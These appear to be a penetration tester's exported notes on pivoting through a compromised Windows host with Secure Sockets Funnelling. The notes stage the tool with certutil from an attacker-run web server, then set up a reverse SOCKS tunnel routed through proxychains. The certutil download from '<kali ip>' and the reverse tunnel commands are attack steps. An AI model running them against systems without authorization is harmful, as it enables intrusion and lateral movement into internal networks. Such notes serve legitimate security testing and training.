<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Secure Sockets Funnelling (SSF)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Secure Sockets Funnelling (SSF)</h1><br/><br />Github: <a href="https://securesocketfunneling.github.io/ssf/#home">https://securesocketfunneling.github.io/ssf/#home</a><br /><br />SSF is a cross-platform tool which allows secure traffic routing of both TCP and UDP packets in a variety of configurations.<br />SSF re  uire 2 components to work:<br />   ◇ <strong>ssfd</strong> → SSF Server that listen for communications<br />   ◇ <strong>ssf</strong> → SSF Client connect to the SSF Server<br /><br /><br /><br /><strong><h3>Set Up</h3></strong><br />On the attacker machine download<br /><div class="codebox"><pre>git clone https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>DenFox93<span style="color:#ff9d00;font-weight:700">/</span>ssf.git</pre></div><br /><br />1. Create Web Server on the Attacker machine<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> ssf<br />python3 -m http.server</pre></div><br />    <a href=""><img src="images/2161-1.png" alt="images/2161-1.png" /></a><br />2. Download zip file on the Windows machine and extract it<br />    <div class="codebox"><pre>C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> <span style="color:#ff9d00;font-weight:700">cd</span> ssf-win-i386-3.0.0<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> certutil -urlcache -f http<span style="color:#ff9d00;font-weight:700">://</span>&lt;kali ip&gt;<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>ssf-win-i386-3.0.0.zip ssf-win-i386-3.0.0.zip<br />C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\&gt;</span> powershell   <span style="color:#0088ff;font-weight:400">#start powershell</span><br />PS&gt; Expand-ZipFile C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\p</span>parker<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#333333;font-weight:400">\s</span>sf-win-i386-3.0.0.zip -Destination C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\p</span>parker<span style="color:#333333;font-weight:400">\D</span>esktop</pre></div><br />    <a href=""><img src="images/2161-2.png" alt="images/2161-2.png" /></a><br />    <a href=""><img src="images/2161-3.png" alt="images/2161-3.png" /></a><br />    *to extract zip files from powershell 2.0 define new function<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">function</span> Expand-ZIPFile<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$file</span>, <span style="color:#7f0044;font-weight:400">$destination</span><span style="color:#ff9d00;font-weight:700">){</span><span style="color:#7f0044;font-weight:400">$shell</span> = new-object -com shell.application<span style="color:#ff9d00;font-weight:700">;</span><span style="color:#7f0044;font-weight:400">$zip</span> = <span style="color:#7f0044;font-weight:400">$shell</span>.NameSpace<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$file</span><span style="color:#ff9d00;font-weight:700">);</span> foreach<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$item</span> <span style="color:#ff9d00;font-weight:700">in</span> <span style="color:#7f0044;font-weight:400">$zip</span>.<span style="color:#ffdd00;font-weight:400">items()</span><span style="color:#ff9d00;font-weight:700">){</span><span style="color:#7f0044;font-weight:400">$shell</span>.Namespace<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$destination</span><span style="color:#ff9d00;font-weight:700">)</span>.copyhere<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$item</span><span style="color:#ff9d00;font-weight:700">)}}</span></pre></div><br /><br /><br /><br /><strong>Reverse Proxy</strong><br />1. <span style="text-decoration:underline;">Attacker machine</span> Server (192.168.59.128): sets ssf up listening on port 11111 for a connection request from a client.<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">cd</span> ssf<span style="color:#ff9d00;font-weight:700">/</span>ssf-linux-x86_64-3.0.0<br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x ssfd<br />ssfd -p 11111</pre></div><br />    <a href=""><img src="images/2161-4.png" alt="images/2161-4.png" /></a><br />    In /etc/proxychains.conf to set up the proxy add the line:<br />    <div class="codebox"><pre>socks4 127.0.0.1 22222</pre></div><br />    Note that you need to set 127.0.0.1 not other interfaces<br />      <br />2. <span style="text-decoration:underline;">Target</span> Client: set up client to connects to the ssfd on the Attacker<br />    <div class="codebox"><pre>ssf -F 22222 -p 11111 192.168.59.128</pre></div><br />    The -F switch makes SSF forward traffic in the other direction, from the server(ssfd) to the client(ssf)<br />    <a href=""><img src="images/2161-5.png" alt="images/2161-5.png" /></a><br /><br /><br /><strong>Use Proxychains through Pivot host</strong><br />    <a href=""><img src="images/2161-6.png" alt="images/2161-6.png" /></a><br /><br /><br /><strong>Bibliography:</strong><br /><a href="https://neilsec.com/penetration-testing/how-to-easily-pivot-through-a-windows-host-with-secure-sockets-funnelling-ssf-part-1/">https://neilsec.com/penetration-testing/how-to-easily-pivot-through-a-windows-host-with-secure-sockets-funnelling-ssf-part-1/</a><br /><a href="https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/">https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/</a><br /><a href="https://ivanitlearning.wordpress.com/2020/04/17/double-pivoting-with-ssf/">https://ivanitlearning.wordpress.com/2020/04/17/double-pivoting-with-ssf/</a></div>
</body>
</html>
